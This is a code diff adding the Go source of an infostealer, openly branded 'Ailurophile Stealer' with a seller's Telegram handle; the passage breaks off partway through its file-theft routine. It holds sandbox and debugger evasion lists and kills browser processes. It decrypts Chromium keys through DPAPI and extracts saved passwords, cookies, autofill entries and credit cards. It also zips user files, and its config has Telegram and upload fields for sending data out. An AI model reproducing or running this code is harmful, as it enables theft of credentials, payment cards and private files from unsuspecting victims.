@@ -1,0 +1,1924 @@
+package main
+import (
+	"encoding/json"
+	"archive/zip"
+	"fmt"
+	"mime/multipart"
+	"net/http"
+	"net/url"
+	"net"
+	"log"
+	"io"
+	"os"
+	"os/exec"
+	"strings"
+	"io/ioutil"
+	"path/filepath"
+	"runtime"
+	"encoding/base64"
+	"errors"
+	"bytes"
+	"time"
+	"database/sql"
+	_ "github.com/mattn/go-sqlite3"
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/hex"
+	"crypto/rand"
+	"math/big"
+	"github.com/kbinani/screenshot"
+	"syscall"
+)
+type Config struct {
+	PayloadCryptedURL string `json:"PayloadCrypted_url"`
+	KeyDecrypt        string `json:"key_decrypt"`
+	TelegramToken     string `json:"Telegram_token"`
+	ChatID            string `json:"Chat_id"`
+	UploadURL         string `json:"upload_url"`
+	Delivery          string `json:"Delivery"`
+	StubURL           string `json:"Stub_url"`
+	UserID            string `json:"user_id"`
+	Welcome           string `json:"welcome"`
+	Startup			  string `json:"Startup"`
+}
+var blackListedIPS = []string{
+	"181.214.153.11", "181.214.153.11", "169.150.197.118", "88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137",
+	"213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222",
+	"188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169",
+	"34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91",
+	"34.105.72.241", "109.74.154.92", "213.33.142.50", "88.132.231.71","95.25.204.90","34.105.72.241","193.128.114.45","78.139.8.50","34.145.89.174",
+	"109.74.154.92","95.25.81.24","20.99.160.173","109.74.154.90","213.33.142.50","92.211.52.62","88.153.199.169","109.145.173.169","109.74.154.91",
+	"88.132.227.238","84.147.62.12","34.141.146.114","93.216.75.209","35.199.6.13","194.154.78.160","212.119.227.151","192.87.28.103","80.211.0.97",
+	"92.211.109.160","195.239.51.59","88.132.226.203","34.85.253.170","195.74.76.222","192.40.57.234","195.181.175.105","23.128.248.46","188.105.91.116",
+	"64.124.12.162","88.132.225.100","35.229.69.227","34.105.183.68","34.142.74.220","92.211.192.144","34.138.96.23","92.211.55.199","188.105.91.173",
+	"34.83.46.130","192.211.110.74","79.104.209.33","109.74.154.91","188.105.91.143","35.237.47.12","178.239.165.70","34.141.245.25","34.85.243.241",
+	"87.166.50.213","34.105.0.27","34.145.195.58","193.225.193.201","34.253.248.228","35.192.93.107","195.239.51.3","84.147.54.113","212.119.227.167",
+}
+var blackListedHostname = []string{
+	"BEE7370C-8C0C-4", "AppOnFly-VPS", "tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",
+	"DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET",
+	"SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
+	"RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
+}
+var blackListedUsername = []string{
+	"WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY",
+	"RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A",
+	"lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl",
+}
+var blackListedGPU = []string{
+	"Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter",
+	"NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter",
+	"K9SC88UK", "Стандартный VGA графический адаптер",
+}
+var blacklistedOS = []string{
+	"Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter",
+	"Windows Server 2016 Standard", "Windows Server 2016 Datacenter",
+}
+var blackListedProcesses = []string{
+	"watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe",
+	"BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe",
+	"HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe",
+	"Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe",
+	"Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe",
+	"httpdebuggerui.exe","vmwareuser.exe","wireshark.exe","vgauthservice.exe","fiddler.exe","vmacthlp.exe","regedit.exe","x96dbg.exe",
+	"cmd.exe","vmsrvc.exe","taskmgr.exe","x32dbg.exe","vboxservice.exe","vmusrvc.exe","df5serv.exe","prl_cc.exe","processhacker.exe",
+	"prl_tools.exe","vboxtray.exe","xenservice.exe","vmtoolsd.exe","qemu-ga.exe","vmwaretray.exe","joeboxcontrol.exe","ida64.exe",
+	"ksdumperclient.exe","ollydbg.exe","ksdumper.exe","pestudio.exe","joeboxserver.exe",
+}
+func checkBlacklistedIP(ip string) bool {
+	for _, value := range blackListedIPS {
+		if value == ip {
+			return true
+		}
+	}
+	return false
+}
+func checkBlacklistedHostname() bool {
+	hostname, err := os.Hostname()
+	if err != nil {
+		return false
+	}
+	for _, value := range blackListedHostname {
+		if value == hostname {
+			return true
+		}
+	}
+	return false
+}
+func checkBlacklistedUsername() bool {
+	username := os.Getenv("USERNAME")
+	if username == "" {
+		username = os.Getenv("USER")
+	}
+	for _, value := range blackListedUsername {
+		if value == username {
+			return true
+		}
+	}
+	return false
+}
+func checkBlacklistedGPU() bool {
+	var gpuInfo string
+	if os.PathSeparator == '\\' {
+		gpuInfo = executeCommand("wmic", "path", "win32_videocontroller", "get", "caption")
+	} else {
+		gpuInfo = executeCommand("lspci", "|", "grep", "VGA")
+	}
+	for _, gpu := range blackListedGPU {
+		if strings.Contains(gpuInfo, gpu) {
+			return true
+		}
+	}
+	return false
+}
+func checkBlacklistedOS() bool {
+	var osInfo string
+	if os.PathSeparator == '\\' {
+		osInfo = os.Getenv("OS")
+	} else {
+		osInfo = executeCommand("uname", "-s") + " " + executeCommand("uname", "-r")
+	}
+	for _, osName := range blacklistedOS {
+		if strings.Contains(osInfo, osName) {
+			return true
+		}
+	}
+	return false
+}
+func checkBlacklistedProcesses() bool {
+	var processList string
+	if os.PathSeparator == '\\' {
+		processList = executeCommand("tasklist")
+	} else {
+		processList = executeCommand("ps", "aux")
+	}
+	for _, process := range blackListedProcesses {
+		if strings.Contains(processList, process) {
+			return true
+		}
+	}
+	return false
+}
+func executeCommand(command ...string) string {
+	output, err := exec.Command(command[0], command[1:]...).Output()
+	if err != nil {
+		return ""
+	}
+	return string(output)
+}
+func getIP() (map[string]interface{}, error) {
+	resp, err := http.Get("https://api.myip.com")
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	var result map[string]interface{}
+	if err := json.Unmarshal(body, &result); err != nil {
+		return nil, err
+	}
+
+	return result, nil
+}
+func getMACAddress() (string, error) {
+	interfaces, err := net.Interfaces()
+	if err != nil {
+		return "", fmt.Errorf("could not get network interfaces: %v", err)
+	}
+
+	for _, iface := range interfaces {
+		// Bỏ qua interface không có địa chỉ hoặc interface bị down
+		if iface.Flags&net.FlagUp == 0 || len(iface.HardwareAddr) == 0 {
+			continue
+		}
+		return iface.HardwareAddr.String(), nil
+	}
+	return "", fmt.Errorf("no MAC address found")
+}
+func getScreenResolution() (int, int, error) {
+	n := screenshot.NumActiveDisplays()
+
+	if n == 0 {
+		return 0, 0, fmt.Errorf("no active displays found")
+	}
+
+	bounds := screenshot.GetDisplayBounds(0) // Lấy độ phân giải màn hình đầu tiên
+	width := bounds.Dx()
+	height := bounds.Dy()
+
+	return width, height, nil
+}
+func getBrowserVersionWithWMIC(executablePath string) (string, error) {
+	// Tạo command để gọi WMIC
+	cmd := exec.Command("wmic", "datafile", "where", fmt.Sprintf("name='%s'", strings.ReplaceAll(executablePath, "\\", "\\\\")), "get", "Version", "/value")
+	output, err := cmd.Output()
+	if err != nil {
+		return "", fmt.Errorf("failed to execute command: %v", err)
+	}
+
+	// Chuyển kết quả output thành chuỗi
+	result := strings.TrimSpace(string(output))
+	// Tách chuỗi để lấy phần phiên bản
+	if strings.Contains(result, "=") {
+		version := strings.Split(result, "=")[1]
+		return version, nil
+	}
+
+	return "Unknown version", nil
+}
+func getBrowserVersionWithPowerShell(executablePath string) (string, error) {
+	// Tạo command để gọi PowerShell
+	cmd := exec.Command("powershell", "-Command", fmt.Sprintf("(Get-Item '%s').VersionInfo.FileVersion", executablePath))
+
+	output, err := cmd.Output()
+	if err != nil {
+		return "", fmt.Errorf("failed to execute PowerShell command: %v", err)
+	}
+
+	// Chuyển kết quả output thành chuỗi
+	version := strings.TrimSpace(string(output))
+
+	if version == "" {
+		return "Unknown version", nil
+	}
+
+	return version, nil
+}
+func checkBrowsersExistence2(browserPaths [][]string) []string {
+	var browserVersions []string
+
+	for _, browser := range browserPaths {
+		browserDir := browser[0]
+		browserName := browser[1]
+
+		// Đường dẫn tới file thực thi của trình duyệt
+		browserExec := filepath.Join(browserDir)
+
+		// Kiểm tra sự tồn tại của trình duyệt
+		if _, err := os.Stat(browserExec); err == nil {
+			// Trình duyệt tồn tại, lấy phiên bản từ file thực thi
+			version, err := getBrowserVersionWithWMIC(browserExec)
+			if err == nil {
+				// Lưu thông tin trình duyệt vào mảng nếu có
+				browserVersions = append(browserVersions, fmt.Sprintf("%s - version: %s", browserName, version))
+			}
+		}
+	}
+
+	return browserVersions
+}
+func checkBrowsersExistence(browserPaths [][]string) []string {
+	var browserVersions []string
+
+	for _, browser := range browserPaths {
+		browserExec := browser[0]
+		browserName := browser[1]
+
+		// Kiểm tra sự tồn tại của trình duyệt
+		if _, err := os.Stat(browserExec); err == nil {
+			// Trình duyệt tồn tại, lấy phiên bản từ file thực thi
+			version, err := getBrowserVersionWithPowerShell(browserExec)
+			if err == nil {
+				// Lưu thông tin trình duyệt vào mảng nếu có
+				browserVersions = append(browserVersions, fmt.Sprintf("%s - version: %s", browserName, version))
+			}
+		}
+	}
+
+	return browserVersions
+}
+func hostname() (string, error) {
+	hostname, err := os.Hostname()
+	if err != nil {
+		return "", err
+	}
+	return hostname, nil
+}
+func pcType() (string, error) {
+	if runtime.GOOS != "windows" {
+		return "", fmt.Errorf("pcType chỉ hỗ trợ trên Windows")
+	}
+	captionOutput, err := exec.Command("wmic", "os", "get", "Caption").Output()
+	if err != nil {
+		return "", err
+	}
+	versionOutput, err := exec.Command("wmic", "os", "get", "Version").Output()
+	if err != nil {
+		return "", err
+	}
+	caption := strings.Split(strings.TrimSpace(string(captionOutput)), "\n")[1]
+	version := strings.Split(strings.TrimSpace(string(versionOutput)), "\n")[1]
+
+	osType := fmt.Sprintf("%s %s", strings.TrimSpace(caption), strings.TrimSpace(version))
+	osType = strings.Join(strings.Fields(osType), " ") 
+
+	return osType, nil
+}
+func arch() string {
+	return runtime.GOARCH
+}
+func filePath() string {
+	return filepath.Dir(os.Args[0])
+}
+func ailurophileDecrypt(data, key string) (string, error) {
+	if key == "" {
+		return "", errors.New("decryption key cannot be empty")
+	}
+	decodedData, err := base64.StdEncoding.DecodeString(data)
+	if err != nil {
+		return "", err
+	}
+
+	keyLength := len(key)
+	dataLength := len(decodedData)
+	decryptedData := make([]byte, dataLength)
+
+	for i := 0; i < dataLength; i++ {
+		decryptedData[i] = byte((int(decodedData[i]) - int(key[i%keyLength]) + 256) % 256)
+	}
+
+	return string(decryptedData), nil
+}
+func getInfo(message, mainPath string) error {
+	credit := "Ailurophile Stealer - https://ailurophilestealer.com - Telegram: @Ailurophilevn\n\n"
+	message = credit + message
+	filePath := filepath.Join(mainPath, "info.txt")
+	if _, err := os.Stat(mainPath); os.IsNotExist(err) {
+		err := os.MkdirAll(mainPath, 0777)
+		if err != nil {
+			return fmt.Errorf("could not create directory: %v", err)
+		}
+	}
+	err := os.WriteFile(filePath, []byte(message), 0644)
+	if err != nil {
+		return fmt.Errorf("could not write to file: %v", err)
+	}
+
+	return nil
+}
+func copyFile(src, dst string) error {
+	sourceFile, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer sourceFile.Close()
+
+	destinationFile, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer destinationFile.Close()
+
+	_, err = destinationFile.ReadFrom(sourceFile)
+	return err
+}
+func copyFile2(src, dst string) error {
+	sourceFile, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer sourceFile.Close()
+
+	destinationFile, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer destinationFile.Close()
+
+	_, err = io.Copy(destinationFile, sourceFile)
+	return err
+}
+func copyFolder(src, dst string) error {
+	entries, err := os.ReadDir(src)
+	if err != nil {
+		return err
+	}
+
+	for _, entry := range entries {
+		srcPath := filepath.Join(src, entry.Name())
+		dstPath := filepath.Join(dst, entry.Name())
+
+		if entry.IsDir() {
+			if err := os.MkdirAll(dstPath, 0777); err != nil {
+				return err
+			}
+			if err := copyFolder(srcPath, dstPath); err != nil {
+				return err
+			}
+		} else {
+			if err := copyFile(srcPath, dstPath); err != nil {
+				return err
+			}
+		}
+	}
+
+	return nil
+}
+func killProcess() {
+	browsersProcess := []string{"chrome.exe", "filezilla.exe", "msedge.exe", "watcher.exe", "opera.exe", "brave.exe", "steam.exe", "RiotClientServices.exe", "Telegram.exe"}
+	additionalProcesses := []string{"discord.exe"}
+	tasks, err := exec.Command("tasklist").Output()
+	if err != nil {
+		return
+	}
+	tasksStr := string(tasks)
+	for _, process := range browsersProcess {
+		if strings.Contains(tasksStr, process) {
+			err := exec.Command("taskkill", "/IM", process, "/F").Run()
+			if err != nil {
+			}
+		}
+	}
+	for _, process := range additionalProcesses {
+		if strings.Contains(tasksStr, process) {
+			err := exec.Command("taskkill", "/F", "/T", "/IM", process).Run()
+			if err != nil {
+			}
+		}
+	}
+}
+func hex2binSafe(hexStr string) ([]byte, error) {
+	if _, err := hex.DecodeString(hexStr); err != nil {
+		return nil, fmt.Errorf("input string must be hexadecimal")
+	}
+	return hex.DecodeString(hexStr)
+}
+func dpapiDecrypt(hexString string) (string, error) {
+	psCommand := fmt.Sprintf(`
+Add-Type -AssemblyName "System.Security"; 
+$decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(%s), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser); 
+$decryptedKeyString = [System.BitConverter]::ToString($decryptedKey) -replace '-', ''; 
+Write-Output $decryptedKeyString`, hexString)
+	cmd := exec.Command("powershell", "-Command", psCommand)
+	var out bytes.Buffer
+	var stderr bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &stderr
+	err := cmd.Run()
+	if err != nil {
+		return "", fmt.Errorf("error executing PowerShell command: %s\nDetails: %s", err, stderr.String())
+	}
+	return strings.TrimSpace(out.String()), nil
+}
+func getEncrypted(browserPaths *[][]string) {
+	for i := range *browserPaths {
+		path := (*browserPaths)[i]
+
+		if _, err := os.Stat(path[0]); os.IsNotExist(err) {
+			continue
+		}
+
+		localStatePath := filepath.Join(path[2], "Local State")
+		if _, err := os.Stat(localStatePath); os.IsNotExist(err) {
+			continue
+		}
+
+		localStateContent, err := os.ReadFile(localStatePath)
+		if err != nil {
+			continue
+		}
+		var localStateJson map[string]interface{}
+		if err := json.Unmarshal(localStateContent, &localStateJson); err != nil {
+			continue
+		}
+		osCrypt, ok := localStateJson["os_crypt"].(map[string]interface{})
+		if !ok || osCrypt["encrypted_key"] == nil {
+			continue
+		}
+		encryptedKeyBase64 := osCrypt["encrypted_key"].(string)
+		encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyBase64)
+		if err != nil {
+			continue
+		}
+		encryptedKey = encryptedKey[5:]
+		hexArray := make([]string, len(encryptedKey))
+		for i, b := range encryptedKey {
+			hexArray[i] = fmt.Sprintf("%d", b)
+		}
+		hexString := strings.Join(hexArray, ",")
+		decryptedKey, err := dpapiDecrypt(hexString)
+		if err != nil {
+			continue
+		}
+		(*browserPaths)[i] = append((*browserPaths)[i], decryptedKey)
+	}
+}
+func getFolderNameAfterAppData(path string) string {
+	if strings.Contains(path, "Local") {
+		return strings.Split(strings.Split(path, "\\Local\\")[1], "\\")[0]
+	}
+	return strings.Split(strings.Split(path, "\\Roaming\\")[1], "\\")[0]
+}
+func getAutofill(browserPaths [][]string, mainFolderPath string) int {
+	userCopyright := "Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"
+	var autofillData []string
+	for _, pathData := range browserPaths {
+		path := pathData[0]
+		applicationName := ""
+		if strings.Contains(path, "Local") {
+			applicationName = strings.Split(strings.Split(path, "\\Local\\")[1], "\\")[0]
+		} else if strings.Contains(path, "Roaming") {
+			applicationName = strings.Split(strings.Split(path, "\\Roaming\\")[1], "\\")[0]
+		}
+		webDataPath := filepath.Join(path, "Web Data")
+		webDataDBPath := filepath.Join(path, "webdata.db")
+
+		if _, err := os.Stat(webDataPath); os.IsNotExist(err) {
+			continue
+		}
+		if err := copyFile(webDataPath, webDataDBPath); err != nil {
+			continue
+		}
+		db, err := sql.Open("sqlite3", webDataDBPath)
+		if err != nil {
+			continue
+		}
+		defer db.Close()
+		query := "SELECT name, value FROM autofill"
+		rows, err := db.Query(query)
+		if err != nil {
+			continue
+		}
+		defer rows.Close()
+		for rows.Next() {
+			var name, value string
+			if err := rows.Scan(&name, &value); err != nil {
+				continue
+			}
+			autofillData = append(autofillData, fmt.Sprintf(
+				"================\nName: %s\nValue: %s\nApplication: %s %s\n",
+				name, value, applicationName, pathData[1],
+			))
+		}
+
+		if len(autofillData) == 0 {
+			autofillData = append(autofillData, fmt.Sprintf("No autofills found for %s %s\n", applicationName, pathData[1]))
+		}
+	}
+
+	if len(autofillData) > 0 {
+		autofillsFolderPath := filepath.Join(mainFolderPath, "Autofills")
+		autofillsFilePath := filepath.Join(autofillsFolderPath, "Autofills.txt")
+		if _, err := os.Stat(autofillsFilePath); err == nil {
+			if err := os.Remove(autofillsFilePath); err != nil {
+				return len(autofillData)
+			}
+		}
+		if _, err := os.Stat(autofillsFolderPath); os.IsNotExist(err) {
+			if err := os.MkdirAll(autofillsFolderPath, 0777); err != nil {
+				return len(autofillData)
+			}
+		}
+		if err := os.WriteFile(autofillsFilePath, []byte(userCopyright+strings.Join(autofillData, "")), 0644); err != nil {
+		}
+	}
+
+	return len(autofillData)
+}
+func getCookies(browserPaths [][]string, mainFolderPath string) int {
+	cookiesData := make(map[string][]string)
+	cookiesData["banner"] = []string{"Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"}
+	totalCookies := 0
+
+	for _, path := range browserPaths {
+		networkPath := filepath.Join(path[0], "Network")
+
+		if _, err := os.Stat(filepath.Join(networkPath, "Cookies")); os.IsNotExist(err) {
+			continue
+		}
+
+		var browserFolder string
+		if strings.Contains(path[0], "Local") {
+			browserFolder = strings.Split(strings.Split(path[0], "\\Local\\")[1], "\\")[0]
+		} else {
+			browserFolder = strings.Split(strings.Split(path[0], "\\Roaming\\")[1], "\\")[0]
+		}
+
+		cookiesPath := filepath.Join(networkPath, "Cookies")
+		db, err := sql.Open("sqlite3", cookiesPath)
+		if err != nil {
+			continue
+		}
+		defer db.Close()
+
+		query := "SELECT host_key, name, encrypted_value FROM cookies"
+		rows, err := db.Query(query)
+		if err != nil {
+			continue
+		}
+		defer rows.Close()
+
+		for rows.Next() {
+			var hostKey, name string
+			var encryptedValue []byte
+			if err := rows.Scan(&hostKey, &name, &encryptedValue); err != nil {
+				continue
+			}
+
+			if len(encryptedValue) < 31 {
+				continue
+			}
+
+			iv := encryptedValue[3:15]
+			encryptedData := encryptedValue[15 : len(encryptedValue)-16]
+			authTag := encryptedValue[len(encryptedValue)-16:]
+
+			var decrypted string
+			if len(path) > 3 && path[3] != "" {
+				key, err := hex.DecodeString(path[3])
+				if err != nil {
+					continue
+				}
+
+				block, err := aes.NewCipher(key)
+				if err != nil {
+					continue
+				}
+
+				aesgcm, err := cipher.NewGCM(block)
+				if err != nil {
+					continue
+				}
+
+				plaintext, err := aesgcm.Open(nil, iv, append(encryptedData, authTag...), nil)
+				if err != nil {
+					continue
+				}
+				decrypted = string(plaintext)
+			} else {
+				continue
+			}
+
+			cookieKey := fmt.Sprintf("%s_%s", browserFolder, path[1])
+			cookiesData[cookieKey] = append(cookiesData[cookieKey], fmt.Sprintf(
+				"%s\tTRUE\t/\tFALSE\t2597573456\t%s\t%s\n\n",
+				hostKey, name, decrypted,
+			))
+			totalCookies++
+		}
+	}
+
+	for browserName, cookies := range cookiesData {
+		if strings.ToLower(browserName) == "banner" {
+			continue
+		}
+
+		if len(cookies) > 0 {
+			cookiesContent := strings.Join(cookies, "")
+			cookiesWithBanner := fmt.Sprintf("Ailurophile Stealer - Telegram: @Ailurophilevn\n\n%s", cookiesContent)
+			fileName := fmt.Sprintf("%s.txt", browserName)
+
+			cookiesFolderPath := filepath.Join(mainFolderPath, "Cookies")
+			cookiesFilePath := filepath.Join(cookiesFolderPath, fileName)
+
+			if _, err := os.Stat(cookiesFolderPath); os.IsNotExist(err) {
+				if err := os.MkdirAll(cookiesFolderPath, 0777); err != nil {
+					continue
+				}
+			}
+
+			if err := os.WriteFile(cookiesFilePath, []byte(cookiesWithBanner), 0644); err != nil {
+				continue
+			}
+		}
+	}
+
+	return totalCookies
+}
+func getPasswords(browserPaths [][]string, mainFolderPath string) int {
+	totalPasswords := 0
+
+	for _, path := range browserPaths {
+		passwords := []string{}
+
+		if _, err := os.Stat(path[0]); os.IsNotExist(err) {
+			continue
+		}
+
+		var appName string
+		if strings.Contains(path[0], "Local") {
+			appName = strings.Split(strings.Split(path[0], "\\Local\\")[1], "\\")[0]
+		} else {
+			appName = strings.Split(strings.Split(path[0], "\\Roaming\\")[1], "\\")[1]
+		}
+
+		loginDataPath := filepath.Join(path[0], "Login Data")
+		passwordsDbPath := filepath.Join(path[0], "passwords.db")
+
+		if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
+			continue
+		}
+
+		if err := copyFile(loginDataPath, passwordsDbPath); err != nil {
+			continue
+		}
+
+		db, err := sql.Open("sqlite3", passwordsDbPath)
+		if err != nil {
+			continue
+		}
+		defer db.Close()
+
+		query := "SELECT origin_url, username_value, password_value, date_created FROM logins"
+		rows, err := db.Query(query)
+		if err != nil {
+			continue
+		}
+		defer rows.Close()
+
+		for rows.Next() {
+			var originURL, usernameValue string
+			var passwordValue []byte
+			var dateCreated int64
+
+			if err := rows.Scan(&originURL, &usernameValue, &passwordValue, &dateCreated); err != nil {
+				continue
+			}
+
+			if usernameValue == "" {
+				continue
+			}
+
+			if len(passwordValue) < 31 {
+				continue
+			}
+
+			iv := passwordValue[3:15]
+			encryptedData := passwordValue[15 : len(passwordValue)-16]
+			authTag := passwordValue[len(passwordValue)-16:]
+
+			var decrypted string
+			if len(path) > 3 && path[3] != "" {
+				key, err := hex.DecodeString(path[3])
+				if err != nil {
+					continue
+				}
+
+				block, err := aes.NewCipher(key)
+				if err != nil {
+					continue
+				}
+
+				aesgcm, err := cipher.NewGCM(block)
+				if err != nil {
+					continue
+				}
+
+				plaintext, err := aesgcm.Open(nil, iv, append(encryptedData, authTag...), nil)
+				if err != nil {
+					continue
+				}
+				decrypted = string(plaintext)
+			} else {
+				continue
+			}
+
+			date := time.Unix((dateCreated/1000000)-11644473600, 0).Format("2006-01-02 15:04:05")
+			passwords = append(passwords, fmt.Sprintf(
+				"================\nURL: %s\nUsername: %s\nPassword: %s\nDate Created: %s\nApplication: %s %s\n",
+				originURL, usernameValue, decrypted, date, appName, path[1],
+			))
+			totalPasswords++
+		}
+
+		if len(passwords) == 0 {
+			passwords = append(passwords, "No password found")
+		}
+
+		if len(passwords) > 0 {
+			passwordsFolderPath := filepath.Join(mainFolderPath, "Passwords")
+			nameFile := fmt.Sprintf("%s-%s.txt", appName, path[1])
+
+			if _, err := os.Stat(passwordsFolderPath); os.IsNotExist(err) {
+				if err := os.MkdirAll(passwordsFolderPath, 0777); err != nil {
+					continue
+				}
+			}
+
+			passwordsFilePath := filepath.Join(passwordsFolderPath, nameFile)
+			if _, err := os.Stat(passwordsFilePath); err == nil {
+				if err := os.Remove(passwordsFilePath); err != nil {
+					continue
+				}
+			}
+
+			if err := os.WriteFile(passwordsFilePath, []byte("Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"+strings.Join(passwords, "")), 0644); err != nil {
+				continue
+			}
+		}
+	}
+
+	return totalPasswords
+}
+func getCards(browserPaths [][]string, mainFolderPath string) int {
+	var cards []string
+	totalCardsFound := 0
+
+	for _, path := range browserPaths {
+		if _, err := os.Stat(path[0]); os.IsNotExist(err) {
+			continue
+		}
+		webDataPath := filepath.Join(path[0], "Web Data")
+		copiedFilePath := filepath.Join(path[0], "Web.db")
+
+		if _, err := os.Stat(webDataPath); os.IsNotExist(err) {
+			continue
+		}
+
+		key, err := hex.DecodeString(path[3])
+		if err != nil {
+			continue
+		}
+
+		if err := copyFile(webDataPath, copiedFilePath); err != nil {
+			continue
+		}
+
+		db, err := sql.Open("sqlite3", copiedFilePath)
+		if err != nil {
+			continue
+		}
+		defer db.Close()
+
+		query := "SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards"
+		rows, err := db.Query(query)
+		if err != nil {
+			continue
+		}
+		defer rows.Close()
+
+		for rows.Next() {
+			var cardNumberEncrypted []byte
+			var expirationYear, expirationMonth int
+			var nameOnCard string
+
+			if err := rows.Scan(&cardNumberEncrypted, &expirationYear, &expirationMonth, &nameOnCard); err != nil {
+				continue
+			}
+
+			month := fmt.Sprintf("%02d", expirationMonth)
+			iv := cardNumberEncrypted[3:15]
+			encryptedData := cardNumberEncrypted[15 : len(cardNumberEncrypted)-16]
+			authTag := cardNumberEncrypted[len(cardNumberEncrypted)-16:]
+
+			block, err := aes.NewCipher(key)
+			if err != nil {
+				continue
+			}
+
+			aesgcm, err := cipher.NewGCM(block)
+			if err != nil {
+				continue
+			}
+
+			decryptedCardNumber, err := aesgcm.Open(nil, iv, append(encryptedData, authTag...), nil)
+			if err != nil {
+				continue
+			}
+
+			cardInfo := fmt.Sprintf("%s\t%s/%d\t%s\n", string(decryptedCardNumber), month, expirationYear, nameOnCard)
+			cards = append(cards, cardInfo)
+			totalCardsFound++
+		}
+
+		if err := os.Remove(copiedFilePath); err != nil {
+		}
+	}
+
+	if len(cards) == 0 {
+		cards = append(cards, "No cards found")
+	}
+
+	if len(cards) > 0 {
+		cardsFolderPath := filepath.Join(mainFolderPath, "Cards")
+		if _, err := os.Stat(cardsFolderPath); os.IsNotExist(err) {
+			if err := os.MkdirAll(cardsFolderPath, 0777); err != nil {
+				return totalCardsFound
+			}
+		}
+
+		cardsFilePath := filepath.Join(cardsFolderPath, "Cards.txt")
+
+		if _, err := os.Stat(cardsFilePath); err == nil {
+			if err := os.Remove(cardsFilePath); err != nil {
+			}
+		}
+
+		if err := os.WriteFile(cardsFilePath, []byte("Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"+strings.Join(cards, "")), 0644); err != nil {
+		}
+	}
+
+	return totalCardsFound
+}
+func stealFiles(allowedExtensions []string, foldersToSearch []string, files []string, mainFolderPath string) int {
+	totalFilesStolen := 0
+
+	zipFilePath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Ailurophile", "stolen_files.zip")
+	if _, err := os.Stat(filepath.Dir(zipFilePath)); os.IsNotExist(err) {
+		if err := os.MkdirAll(filepath.Dir(zipFilePath), 0777); err != nil {
+			return totalFilesStolen
+		}
+	}
+	zipFile, err := os.Create(zipFilePath)
+	if err != nil {
+		return totalFilesStolen
+	}
+	defer zipFile.Close()
+
+	zipWriter := zip.NewWriter(zipFile)
+	defer zipWriter.Close()
+
+	for _, folder := range foldersToSearch {
+		directory := filepath.Join(os.Getenv("USERPROFILE"), folder)
+
+		if _, err := os.Stat(directory); os.IsNotExist(err) || !isDirectory(directory) {
+			continue
+		}
+
+		err := filepath.Walk(directory, func(filePath string, info os.FileInfo, err error) error {
+			if err != nil {
+				return err
+			}
+
+			if !info.IsDir() && matchesCriteria(filePath, allowedExtensions, files) && info.Size() < 3*1024*1024 {
+				zipFileWriter, err := zipWriter.Create(filepath.Base(filePath))
+				if err != nil {
+					return fmt.Errorf("error adding file to zip: %v", err)
+				}
+
+				file, err := os.Open(filePath)
+				if err != nil {
+					return fmt.Errorf("error opening file: %v", err)
+				}
+				defer file.Close()
+
